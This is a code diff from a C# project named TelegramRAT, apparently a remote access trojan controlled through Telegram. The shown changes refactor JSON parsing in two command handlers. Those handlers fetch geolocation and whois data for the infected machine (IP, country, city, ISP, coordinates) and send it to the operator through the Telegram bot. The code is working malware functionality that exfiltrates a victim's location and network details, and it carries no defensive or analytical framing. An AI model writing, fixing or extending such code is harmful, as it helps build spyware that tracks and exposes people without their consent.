@@ -208,12 +208,17 @@ namespace TelegramRAT
                         WebClient client = new WebClient();
                         string response = client.DownloadString(url);
                         // Parse json
-                        dynamic json = JSON.Parse(response);
-                        if (json.result == 200)
+                        var json = JSON.Parse(response);
+                        if (json["result"] == 200)
                         {
-                            float lat = json.data.lat;
-                            float lon = json.data.lon;
-                            float range = json.data.range;
+                            var data = json["data"];
+                            float lat = 0.0f, lon = 0.0f, range = 0.0f;
+
+                            lat = data["lat"];
+                            lon = data["lon"];
+                            if(data.HasKey("range"))
+                                range = data["range"];
+
                             telegram.sendLocation(lat, lon);
                             telegram.sendText(
                                 "\n📡 Location:" +
@@ -247,13 +252,13 @@ namespace TelegramRAT
                         dynamic json = JSON.Parse(response);
                         telegram.sendText(
                             "\n📡 Whois:" +
-                            "\nIP: " + json.query +
-                            "\nCountry: " + json.country + " [" + json.countryCode + "]" +
-                            "\nCity: " + json.city +
-                            "\nRegion: " + json.regionName +
-                            "\nInternet provider: " + json.isp +
-                            "\nLatitude: " + json.lat +
-                            "\nLongitude: " + json.lon +
+                            "\nIP: " + json["query"] +
+                            "\nCountry: " + json["country"] + "[" + json["countryCode"] + "]" +
+                            "\nCity: " + json["city"] +
+                            "\nRegion: " + json["regionName"] +
+                            "\nInternet provider: " + json["isp"] +
+                            "\nLatitude: " + json["lat"] +
+                            "\nLongitude: " + json["lon"] +
                             "");
                         break;
                     }
